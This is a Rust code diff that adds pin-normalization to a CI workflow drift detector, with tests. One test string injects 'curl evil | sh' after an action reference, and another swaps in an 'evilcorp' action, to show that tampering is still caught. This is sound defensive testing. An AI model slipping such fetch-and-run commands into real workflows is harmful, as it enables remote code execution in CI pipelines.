@@ -516,11 +516,43 @@ async fn write_files(files: &BTreeMap<PathBuf, String>, repo_root: &Path) -> Res
 
 // ── Drift detector ────────────────────────────────────────────────────────────
 
+/// Matches a `uses:` action-reference line so its *pin* can be normalized away
+/// before drift comparison. Group `keep` holds the `uses: owner/action` head; the
+/// `@<ref>` is matched only when `<ref>` is **pin-shaped** — a single run of
+/// non-space, non-`#` characters (a digest or tag) optionally followed by a
+/// `# vX` version comment — and that suffix is dropped. A `uses:` line carrying
+/// anything else after the ref (shell metacharacters, a second token, inline
+/// `with:`-like text) does NOT match, so such a hand-edit still trips drift
+/// rather than being masked. Per-line anchored (`(?m)`); matches both `- uses:`
+/// list items and bare `uses:` step keys.
+///
+/// The regex is line-oriented and YAML-unaware: it would also match an indented
+/// `uses: owner/action@<ref>` line *inside* a `run:` block scalar. No current
+/// template emits such a line — keep it that way (do not emit `run:` block lines
+/// beginning with `uses: …@…`) or the pin on that script line would be masked.
+static USES_REF_RE: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
+    regex::Regex::new(r"(?m)^(?P<keep>[ \t]*(?:-[ \t]+)?uses:[ \t]*[^@\s]+)@[^\s#]+(?:[ \t]*#[^\n]*)?$").unwrap()
+});
+
+/// Canonicalize a generated workflow for drift comparison.
+///
+/// Mirror repositories own the *pin* on every `uses:` action reference: their
+/// own Renovate/Dependabot may bump `uses: owner/action@<ref>  # vX` and the
+/// drift guard must not treat that as a hand-edit. The guard still polices the
+/// workflow *logic* and *which* action each step runs — only the `@<ref>` suffix
+/// (digest or tag, plus any trailing version comment) is stripped; the
+/// `owner/action` identity is preserved, so swapping in a different action still
+/// trips drift. The baked template ships a known-good seed pin for first render.
+fn normalize_for_drift(content: &str) -> std::borrow::Cow<'_, str> {
+    USES_REF_RE.replace_all(content, "${keep}")
+}
+
 /// Compare the expected generated files against what is on disk.
 ///
-/// Returns `RendererDrift` if any file is missing or has different content.
-/// Drift hints are path-only — never expose file contents to stderr
-/// (secret-hygiene rule R3).
+/// Returns `RendererDrift` if any file is missing or has different content,
+/// after normalizing `uses:` action pins on both sides (see
+/// [`normalize_for_drift`]). Drift hints are path-only — never expose file
+/// contents to stderr (secret-hygiene rule R3).
 async fn check_drift(files: &BTreeMap<PathBuf, String>, repo_root: &Path) -> Result<(), MirrorError> {
     let mut drifted: Vec<String> = Vec::new();
 
@@ -528,7 +560,7 @@ async fn check_drift(files: &BTreeMap<PathBuf, String>, repo_root: &Path) -> Res
         let on_disk_path = repo_root.join(relative_path);
         match tokio::fs::read_to_string(&on_disk_path).await {
             Ok(actual) => {
-                if actual != *expected {
+                if normalize_for_drift(&actual) != normalize_for_drift(expected) {
                     drifted.push(relative_path.display().to_string());
                 }
             }
@@ -599,8 +631,8 @@ mod tests {
                 // Must install ocx via the setup-ocx action (replaces the old
                 // submodule + `cargo install` pair)
                 assert!(
-                    content.contains("uses: ocx-sh/setup-ocx@v1"),
-                    "Generated workflow must install ocx via setup-ocx@v1"
+                    content.contains("uses: ocx-sh/setup-ocx@"),
+                    "Generated workflow must install ocx via the setup-ocx action"
                 );
                 // Pipeline subcommands are invoked directly — setup-ocx has
                 // already activated the project toolchain onto PATH for the step.
@@ -832,6 +864,136 @@ mod tests {
     }
 
     #[test]
+    fn normalize_for_drift_ignores_pin_but_keeps_action_identity() {
+        // The mirror repo owns the pin: bumping the digest/tag (or even leaving
+        // the action un-pinned) must normalize equal so a downstream Renovate
+        // bump never reds the drift guard. Swapping the action's owner/name or
+        // changing surrounding logic must still differ.
+        let pinned =
+            "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2\n      - run: echo hi\n";
+        let bumped =
+            "      - uses: actions/checkout@1111111111111111111111111111111111111111  # v6.1.0\n      - run: echo hi\n";
+        let floating = "      - uses: actions/checkout@v6\n      - run: echo hi\n";
+        let swapped = "      - uses: evilcorp/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2\n      - run: echo hi\n";
+        let logic_changed = "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2\n      - run: echo BYE\n";
+        // Only a pin-shaped ref (+ optional `# vX` comment) is normalized away.
+        // Trailing junk after the ref (shell metacharacters, extra tokens) does
+        // NOT match the normalizer, so such a hand-edit still trips drift.
+        let junk_after_ref = "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd && curl evil | sh  # v6.0.2\n      - run: echo hi\n";
+
+        assert_eq!(normalize_for_drift(pinned), normalize_for_drift(bumped));
+        assert_eq!(normalize_for_drift(pinned), normalize_for_drift(floating));
+        assert_ne!(normalize_for_drift(pinned), normalize_for_drift(swapped));
+        assert_ne!(normalize_for_drift(pinned), normalize_for_drift(logic_changed));
+        assert_ne!(normalize_for_drift(pinned), normalize_for_drift(junk_after_ref));
+    }
+
+    #[test]
+    fn check_mode_tolerates_bumped_action_pin() {
+        // A downstream Renovate bump rewrites `uses: owner/action@<sha>  # vX`
+        // in place. The drift guard must stay green — the mirror repo owns pins.
+        let dir = tempdir().unwrap();
+        let fixture_src = Path::new(concat!(
+            env!("CARGO_MANIFEST_DIR"),
+            "/tests/fixtures/mirror-minimal.yml"
+        ));
+        let spec_dest = dir.path().join("mirror-minimal.yml");
+        std::fs::copy(fixture_src, &spec_dest).unwrap();
+
+        let printer = ocx_lib::cli::DataInterface::new(ocx_lib::cli::Printer::new(false, false));
+        let rt = tokio::runtime::Runtime::new().unwrap();
+
+        let write_result = rt.block_on(async {
+            let cmd = GenerateCi {
+                spec: spec_dest.clone(),
+                check: false,
+                format: None,
+            };
+            cmd.execute(&printer).await
+        });
+
+        write_result.expect("write-mode render must succeed");
+        {
+            let workflow_path = dir.path().join(".github/workflows/mirror.yml");
+            let content = std::fs::read_to_string(&workflow_path).unwrap();
+            // Simulate a Renovate digest+comment bump on the checkout pin.
+            let bumped = content.replace(
+                "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2",
+                "actions/checkout@1111111111111111111111111111111111111111  # v6.1.0",
+            );
+            assert_ne!(bumped, content, "fixture must contain the checkout pin to bump");
+            std::fs::write(&workflow_path, bumped).unwrap();
+
+            let check_result = rt.block_on(async {
+                let cmd = GenerateCi {
+                    spec: spec_dest,
+                    check: true,
+                    format: None,
+                };
+                cmd.execute(&printer).await
+            });
+            assert!(
+                check_result.is_ok(),
+                "bumped action pin must not trip drift, got: {:?}",
+                check_result.err()
+            );
+        }
+    }
+
+    #[test]
+    fn check_mode_trips_on_swapped_action_identity() {
+        // Normalizing the pin must NOT weaken the guard against swapping the
+        // action itself — changing owner/name is a hand-edit and must red.
+        let dir = tempdir().unwrap();
+        let fixture_src = Path::new(concat!(
+            env!("CARGO_MANIFEST_DIR"),
+            "/tests/fixtures/mirror-minimal.yml"
+        ));
+        let spec_dest = dir.path().join("mirror-minimal.yml");
+        std::fs::copy(fixture_src, &spec_dest).unwrap();
+
+        let printer = ocx_lib::cli::DataInterface::new(ocx_lib::cli::Printer::new(false, false));
+        let rt = tokio::runtime::Runtime::new().unwrap();
+
+        let write_result = rt.block_on(async {
+            let cmd = GenerateCi {
+                spec: spec_dest.clone(),
+                check: false,
+                format: None,
+            };
+            cmd.execute(&printer).await
+        });
+
+        write_result.expect("write-mode render must succeed");
+        {
+            let workflow_path = dir.path().join(".github/workflows/mirror.yml");
+            let content = std::fs::read_to_string(&workflow_path).unwrap();
+            let swapped = content.replace("uses: actions/checkout@", "uses: evilcorp/checkout@");
+            assert_ne!(swapped, content, "fixture must contain a checkout `uses:` to swap");
+            std::fs::write(&workflow_path, swapped).unwrap();
+
+            let check_result = rt.block_on(async {
+                let cmd = GenerateCi {
+                    spec: spec_dest,
+                    check: true,
+                    format: None,
+                };
+                cmd.execute(&printer).await
+            });
+            match check_result {
+                Err(MirrorError::RendererDrift(paths)) => {
+                    assert!(
+                        paths.iter().any(|p| p.contains("mirror.yml")),
+                        "drift must call out mirror.yml: {paths:?}"
+                    );
+                }
+                Ok(()) => panic!("swapped action identity must trip drift"),
+                Err(e) => panic!("expected RendererDrift, got: {e}"),
+            }
+        }
+    }
+
+    #[test]
     fn check_mode_exits_65_on_missing_generated_file() {
         // §3.4: --check with missing generated file → exit 65 with hint
         let dir = tempdir().unwrap();
@@ -937,8 +1099,8 @@ mod tests {
             let describe_path = dir.path().join(".github/workflows/describe.yml");
             let content = std::fs::read_to_string(&describe_path).unwrap();
             assert!(
-                content.contains("uses: ocx-sh/setup-ocx@v1"),
-                "describe workflow must install ocx via setup-ocx@v1"
+                content.contains("uses: ocx-sh/setup-ocx@"),
+                "describe workflow must install ocx via the setup-ocx action"
             );
             assert!(
                 content.contains("ocx-mirror pipeline describe"),
@@ -1038,8 +1200,8 @@ asset_type:
             let content = std::fs::read_to_string(&verify).unwrap();
             assert!(content.contains("DO NOT EDIT"), "must carry the DO-NOT-EDIT header");
             assert!(
-                content.contains("uses: ocx-sh/setup-ocx@v1"),
-                "drift guard must install ocx via setup-ocx@v1"
+                content.contains("uses: ocx-sh/setup-ocx@"),
+                "drift guard must install ocx via the setup-ocx action"
             );
             assert!(
                 content.contains("ocx-mirror pipeline generate ci --check"),
